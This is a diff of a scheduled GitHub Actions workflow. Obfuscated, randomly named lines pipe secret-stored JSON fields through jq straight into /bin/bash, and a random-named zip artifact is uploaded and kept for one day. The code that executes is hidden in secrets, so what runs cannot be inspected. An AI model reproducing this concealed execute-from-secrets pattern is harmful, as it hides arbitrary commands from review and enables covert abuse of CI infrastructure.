@@ -1,26 +1,26 @@
 name: shiguanjiji
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '33 1/6 * * *'
 
-jobs:  # 8471
+  schedule:
+    - cron: '25 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: shiguanjiji
         env:
-          usjdo51632: ${{ secrets.usjdo51632 }}
+          xtm0: ${{ secrets.xtm0 }}
         run: |
-          echo $usjdo51632 | jq -r .zjja342 | /bin/bash
-          echo $zzul76 | jq -r .mguhx25 | /bin/bash
-          echo $gj3 | jq -r .hm409 | /bin/bash
-          echo $aaqqb707 | jq -r .vkc5703 | /bin/bash
-          echo $axt480 | jq -r .aqlq52 | /bin/bash
-          echo $wbgtn25 | jq -r .u75808 | /bin/bash
-          echo $oxoa0 | jq -r .ysd395 | /bin/bash
-          echo $rozs7 | jq -r .o1 | /bin/bash
-          echo $q988 | jq -r .s8 | /bin/bash
+          printf '%s' "$xtm0" | jq -r .tbw40 | /bin/bash
+          echo $iebz1 | jq -r .yygtk4577 | /bin/bash
+          printf '%s' "$pv14" | jq -r .sta666 | /bin/bash
+          printf '%s' "$fm0" | jq -r .xn053 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: oAokATEG
+          path: "*.zip"
+          retention-days: 1
